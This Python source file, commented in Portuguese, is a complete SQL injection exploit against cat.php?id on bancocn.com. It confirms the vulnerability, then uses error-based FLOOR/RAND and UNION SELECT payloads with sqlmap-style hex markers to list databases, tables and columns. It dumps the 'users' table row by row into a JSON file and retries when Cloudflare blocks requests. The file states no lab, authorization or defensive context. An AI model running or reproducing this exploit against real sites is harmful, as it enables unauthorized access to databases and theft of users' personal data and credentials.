#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script de SQL Injection para bancocn.com
Explora vulnerabilidade em cat.php?id=1
"""

import requests
import re
import sys
import json
import time
from urllib.parse import quote
from datetime import datetime

class SQLInjection:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def make_request(self, payload, retry=3):
        """Faz requisição com payload SQL injection"""
        url = f"{self.base_url}/cat.php?id={quote(str(payload))}"
        for attempt in range(retry):
            try:
                response = self.session.get(url, timeout=10)
                # Verifica se não é erro 521 (Cloudflare)
                if response.status_code == 521:
                    if attempt < retry - 1:
                        time.sleep(2)
                        continue
                return response.text
            except requests.exceptions.Timeout:
                if attempt < retry - 1:
                    time.sleep(1)
                    continue
                print(f"[!] Timeout na requisição após {retry} tentativas")
            except Exception as e:
                if attempt < retry - 1:
                    time.sleep(1)
                    continue
                print(f"[!] Erro na requisição: {e}")
        return None
    
    def test_vulnerability(self):
        """Testa se a vulnerabilidade existe"""
        print("[*] Testando vulnerabilidade SQL Injection...")
        
        # Testa com aspas simples
        normal = self.make_request("1")
        error_test = self.make_request("1'")
        
        if error_test and "SQL syntax" in error_test:
            print("[+] Vulnerabilidade confirmada!")
            return True
        else:
            print("[!] Vulnerabilidade não confirmada")
            return False
    
    def union_query(self, query, position=3):
        """
        Executa query usando UNION SELECT
        position indica em qual coluna da UNION os dados serão exibidos (1-3)
        """
        # Usa id negativo para garantir que a primeira parte não retorne dados
        payload = f"-1 UNION ALL SELECT NULL, NULL, ({query})-- -"
        if position == 1:
            payload = f"-1 UNION ALL SELECT ({query}), NULL, NULL-- -"
        elif position == 2:
            payload = f"-1 UNION ALL SELECT NULL, ({query}), NULL-- -"
        
        response = self.make_request(payload)
        if response:
            # Tenta extrair o valor retornado (precisa ser ajustado conforme o HTML)
            # Remove tags HTML e espaços
            clean = re.sub(r'<[^>]+>', '', response)
            clean = ' '.join(clean.split())
            return clean[:500]  # Limita tamanho
        return None
    
    def extract_string_error_based(self, query):
        """Extrai string usando error-based injection (FLOOR/RAND)"""
        # Usa técnica FLOOR/RAND que funciona no MySQL/MariaDB
        payload = f"1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,({query}),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
        response = self.make_request(payload)
        if response:
            # Procura por padrão :valor: na mensagem de erro
            match = re.search(r':([^:]+):', response)
            if match:
                return match.group(1).strip()
        return None
    
    def extract_string_union(self, query, position=3):
        """Extrai string usando UNION SELECT com hex encoding"""
        # Usa hex encoding como o sqlmap
        hex_query = f"CONCAT(0x716a707071,({query}),0x71707a7a71)"
        payload = f"-1 UNION ALL SELECT NULL, NULL, {hex_query}-- -"
        if position == 1:
            payload = f"-1 UNION ALL SELECT {hex_query}, NULL, NULL-- -"
        elif position == 2:
            payload = f"-1 UNION ALL SELECT NULL, {hex_query}, NULL-- -"
        
        response = self.make_request(payload)
        if response:
            # Procura por padrão qjppq...valor...qpzzq (hex do sqlmap)
            # 0x716a707071 = 'qjppq', 0x71707a7a71 = 'qpzzq'
            match = re.search(r'qjppq(.+?)qpzzq', response, re.DOTALL)
            if match:
                return match.group(1).strip()
            # Tenta também com padrão mais simples
            match = re.search(r':([^:<>"]+):', response)
            if match and len(match.group(1)) > 0:
                return match.group(1).strip()
        return None
    
    def extract_string(self, query, position=3, use_error=True):
        """Extrai string usando a melhor técnica disponível"""
        # Tenta error-based primeiro (mais confiável)
        if use_error:
            try:
                result = self.extract_string_error_based(query)
                if result and len(result) > 0:
                    return result
            except Exception as e:
                pass
        
        # Fallback para UNION - tenta todas as posições
        for pos in [3, 2, 1]:
            try:
                result = self.extract_string_union(query, pos)
                if result and len(result) > 0:
                    return result
            except Exception as e:
                continue
        
        return None
    
    def get_databases(self):
        """Lista todos os databases"""
        print("\n[*] Listando databases...")
        query = "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')"
        result = self.extract_string(query, use_error=True)
        if result:
            databases = result.split(',')
            print(f"[+] Databases encontrados: {len(databases)}")
            for db in databases:
                print(f"    - {db}")
            return databases
        return []
    
    def get_tables(self, database):
        """Lista tabelas de um database"""
        print(f"\n[*] Listando tabelas do database '{database}'...")
        query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        result = self.extract_string(query, use_error=True)
        if result:
            tables = result.split(',')
            print(f"[+] Tabelas encontradas: {len(tables)}")
            for table in tables:
                print(f"    - {table}")
            return tables
        return []
    
    def get_columns(self, database, table):
        """Lista colunas de uma tabela"""
        print(f"\n[*] Listando colunas da tabela '{table}'...")
        query = f"SELECT GROUP_CONCAT(CONCAT(column_name,':',data_type)) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        result = self.extract_string(query, use_error=True)
        if result:
            columns = []
            for col_info in result.split(','):
                if ':' in col_info:
                    col_name, col_type = col_info.split(':', 1)
                    columns.append((col_name, col_type))
                    print(f"    - {col_name} ({col_type})")
            return columns
        return []
    
    def count_rows(self, database, table):
        """Conta número de linhas em uma tabela"""
        query = f"SELECT COUNT(*) FROM {database}.{table}"
        result = self.extract_string(query, use_error=True)
        if result and result.isdigit():
            return int(result)
        return 0
    
    def extract_row(self, database, table, columns, row_num):
        """Extrai uma linha específica de uma tabela"""
        col_list = ','.join([f"`{col[0]}`" for col in columns])
        query = f"SELECT CONCAT_WS('|',{col_list}) FROM {database}.{table} LIMIT {row_num},1"
        result = self.extract_string(query, use_error=True)
        if result:
            values = result.split('|')
            row_data = {}
            for i, col in enumerate(columns):
                if i < len(values):
                    row_data[col[0]] = values[i]
            return row_data
        return None
    
    def dump_table(self, database, table, save_file=None):
        """Faz dump completo de uma tabela"""
        print(f"\n[*] Fazendo dump da tabela '{database}.{table}'...")
        
        # Lista colunas
        columns = self.get_columns(database, table)
        if not columns:
            print("[!] Não foi possível listar colunas")
            return []
        
        # Conta linhas
        row_count = self.count_rows(database, table)
        print(f"[*] Total de linhas: {row_count}")
        
        # Extrai cada linha
        rows = []
        for i in range(row_count):
            print(f"[*] Extraindo linha {i+1}/{row_count}...", end='\r', flush=True)
            row = self.extract_row(database, table, columns, i)
            if row:
                rows.append(row)
        print()  # Nova linha
        
        # Exibe resultados
        if rows:
            print(f"\n[+] {len(rows)} linhas extraídas:")
            print("\n" + "="*80)
            for i, row in enumerate(rows, 1):
                print(f"\nLinha {i}:")
                for col_name, value in row.items():
                    print(f"  {col_name}: {value}")
            print("="*80)
            
            # Salva em arquivo se especificado
            if save_file:
                self.save_results(database, table, rows, save_file)
        
        return rows
    
    def save_results(self, database, table, rows, filename):
        """Salva resultados em arquivo JSON"""
        try:
            data = {
                'database': database,
                'table': table,
                'timestamp': datetime.now().isoformat(),
                'rows': rows
            }
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"\n[+] Resultados salvos em: {filename}")
        except Exception as e:
            print(f"[!] Erro ao salvar arquivo: {e}")
    
    def exploit(self):
        """Executa exploração completa"""
        print("="*80)
        print("SQL Injection Exploit - bancocn.com")
        print("="*80)
        
        # Testa vulnerabilidade
        if not self.test_vulnerability():
            print("[!] Abortando...")
            return
        
        # Lista databases
        databases = self.get_databases()
        if not databases:
            print("[!] Não foi possível listar databases")
            return
        
        # Foca no database bancocn
        target_db = 'bancocn'
        if target_db not in databases:
            print(f"[!] Database '{target_db}' não encontrado")
            target_db = databases[0]
        
        # Lista tabelas
        tables = self.get_tables(target_db)
        if not tables:
            print("[!] Não foi possível listar tabelas")
            return
        
        # Dump da tabela users
        output_file = f"dump_{target_db}_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        if 'users' in tables:
            self.dump_table(target_db, 'users', save_file=output_file)
        else:
            print("[!] Tabela 'users' não encontrada")
            # Dump da primeira tabela como exemplo
            if tables:
                output_file = f"dump_{target_db}_{tables[0]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                self.dump_table(target_db, tables[0], save_file=output_file)


def main():
    base_url = "http://www.bancocn.com"
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print(f"[*] Target: {base_url}")
    
    exploit = SQLInjection(base_url)
    exploit.exploit()


if __name__ == "__main__":
    main()

